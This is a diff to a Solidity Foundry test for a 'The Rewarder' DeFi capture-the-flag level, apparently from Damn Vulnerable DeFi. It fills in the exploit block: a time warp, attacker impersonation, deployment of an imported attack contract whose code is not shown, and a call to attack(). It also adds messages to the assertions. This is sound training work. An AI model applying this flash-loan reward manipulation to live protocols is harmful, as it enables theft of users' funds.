@@ -9,6 +9,7 @@ import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPo
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {AttackerContract} from "../../../src/Contracts/the-rewarder/solution/AttackContract.sol";
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
@@ -88,6 +89,13 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
+        vm.warp(theRewarderPool.lastRecordedSnapshotTimestamp() + 5 days);
+        assertEq(theRewarderPool.isNewRewardsRound(), true);
+        vm.startPrank(attacker);
+        AttackerContract attackerContract =
+            new AttackerContract(address(flashLoanerPool), address(dvt), address(theRewarderPool));
+        attackerContract.attack();
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -104,15 +112,15 @@ contract TheRewarder is Test {
             theRewarderPool.distributeRewards();
             uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(users[i]);
             uint256 delta = rewardPerUser - 25e18;
-            assertLt(delta, 1e16);
+            assertLt(delta, 1e16, "assert failed for user");
         }
         // Rewards must have been issued to the attacker account
-        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
+        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18, "assert failed for total supply");
         uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(attacker);
 
         // The amount of rewards earned should be really close to 100 tokens
         uint256 deltaAttacker = 100e18 - rewardAttacker;
-        assertLt(deltaAttacker, 1e17);
+        assertLt(deltaAttacker, 1e17, "assert failed for delta attacker");
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
